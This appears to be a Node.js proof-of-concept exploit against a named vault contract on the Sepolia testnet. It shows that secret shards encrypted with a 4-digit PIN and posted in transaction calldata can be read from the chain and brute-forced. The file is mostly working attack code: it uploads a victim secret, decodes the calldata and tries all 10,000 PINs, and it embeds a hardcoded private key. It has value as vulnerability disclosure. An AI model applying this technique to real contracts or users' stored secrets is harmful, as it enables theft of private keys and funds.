const { ethers } = require("ethers");
const CryptoJS = require("crypto-js");

// === LIVE PROOF: ENCRYPTION CRACKING ON SEPOLIA ===
// 1. VICTIM: Uploads a secret encrypted with a weak PIN to the blockchain.
// 2. ATTACKER: Watches the chain, grabs the encrypted string, and cracks it.

const RPC_URL = "https://ethereum-sepolia.publicnode.com";
const CUSTODY_ADDRESS = "0x3B3AD30e32fFef3dD598dd3EfDf6DCC392897786";
const VICTIM_PK = "0xa12f4dc456a8fa989f093604e702384f9691f99c3242f615fc9a1ba0d3b3eaf2";

const ABI = [
    "function createVault(bytes32 _creator) external",
    "function addParticipant(bytes32 _creator, bytes32 _participant, string _shard) external",
    "event NewParticipant(bytes32 indexed creator, bytes32 indexed participant, string _shard)"
];

async function run() {
    console.log("=== LIVE EXPLOIT: ON-CHAIN PIN CRACKING ===\n");

    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
    const wallet = new ethers.Wallet(VICTIM_PK, provider);
    const contract = new ethers.Contract(CUSTODY_ADDRESS, ABI, wallet);

    // --- STEP 1: PREPARE THE SECRET (VICTIM) ---
    console.log("[VICTIM] Generating Secret...");
    const originalSecret = "0x" + require("crypto").randomBytes(32).toString("hex");
    const weakPin = Math.floor(Math.random() * 10000).toString().padStart(4, '0');

    console.log(`Secret:  ${originalSecret}`);
    console.log(`PIN:     ${weakPin} (Weak 4-digit PIN)`);

    // Encrypt
    const keyHex = ethers.utils.formatBytes32String(weakPin);
    const key = CryptoJS.enc.Hex.parse(keyHex.slice(2));
    const iv = CryptoJS.lib.WordArray.random(16);
    const encrypted = CryptoJS.AES.encrypt(originalSecret, key, {
        iv: iv,
        mode: CryptoJS.mode.CBC,
        padding: CryptoJS.pad.Pkcs7
    });
    const shardString = `0xID.${iv.toString(CryptoJS.enc.Base64)}.${encrypted.toString()}`;
    console.log(`Shard:   ${shardString.substring(0, 50)}...`);

    // --- STEP 2: UPLOAD TO BLOCKCHAIN (VICTIM) ---
    console.log("\n[VICTIM] Sending Transaction to Sepolia...");
    const vaultId = ethers.utils.formatBytes32String("LiveHack" + Math.floor(Math.random() * 1000));
    const participantId = ethers.utils.formatBytes32String("User1");

    // We don't need to createVault first for addParticipant in this specific contract logic? 
    // Wait, addParticipant checks only if creator exists? 
    // Actually, usually we need a vault. To be safe/clean, let's just make a vault first or use an existing one ID?
    // The previous scripts created vaults. Let's create one quickly to be 100% sure it doesn't revert "Vault not found".

    try {
        const txCreate = await contract.createVault(vaultId, { gasLimit: 200000 });
        await txCreate.wait();
        // console.log("Vault created.");
    } catch (e) {
        // console.log("Vault might exist, proceeding...");
    }

    const tx = await contract.addParticipant(vaultId, participantId, shardString, { gasLimit: 300000 });
    console.log(`Tx Hash: ${tx.hash}`);
    console.log("[*] Waiting for confirmation...");
    const receipt = await tx.wait();
    console.log(`Confirmed in Block: ${receipt.blockNumber}\n`);


    // --- STEP 3: THE HACK (ATTACKER) ---
    console.log("[ATTACKER] Scanning Transaction Input Data (Calldata)...");

    // In this specific contract, events are seemingly disabled/missing for addParticipant.
    // However, the data is still PUBLIC in the transaction input itself.

    const iface = new ethers.utils.Interface(ABI);
    const decoded = iface.parseTransaction({ data: tx.data, value: tx.value });
    const capturedShard = decoded.args._shard;

    console.log(`[ATTACKER] CAPTURED SHARD FROM INPUT: ${capturedShard.substring(0, 50)}...`);

    if (!capturedShard) {
        console.log("[-] Failed to capture input data.");
        return;
    }

    // --- STEP 4: BRUTE FORCE (ATTACKER) ---
    console.log("\n[ATTACKER] Starting PIN Brute-force...");
    const start = Date.now();

    for (let i = 0; i <= 9999; i++) {
        const candidate = i.toString().padStart(4, '0');
        try {
            const parts = capturedShard.split('.');
            const iv_ = CryptoJS.enc.Base64.parse(parts[1]);
            const ct_ = CryptoJS.enc.Base64.parse(parts[2]);
            const k_ = CryptoJS.enc.Hex.parse(ethers.utils.formatBytes32String(candidate).slice(2));

            const decrypted = CryptoJS.AES.decrypt(
                { ciphertext: ct_ },
                k_,
                { iv: iv_, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 }
            );

            const res = decrypted.toString(CryptoJS.enc.Utf8);
            if (res === originalSecret) { // In real attack we verify "0x" prefix + length. Here we match exact.
                const duration = (Date.now() - start) / 1000;
                console.log(`\n[!!!] CRACKED! PIN: [ ${candidate} ] in ${duration.toFixed(3)}s`);
                console.log(`[!!!] RECOVERED SECRET: ${res}`);

                if (res === originalSecret) {
                    console.log("\nSUCCESS: The secret recovered from the blockchain matches the original.");
                }
                break;
            }
        } catch (e) { }
    }
}

run().catch(error => {
    console.error(error);
    process.exit(1);
});
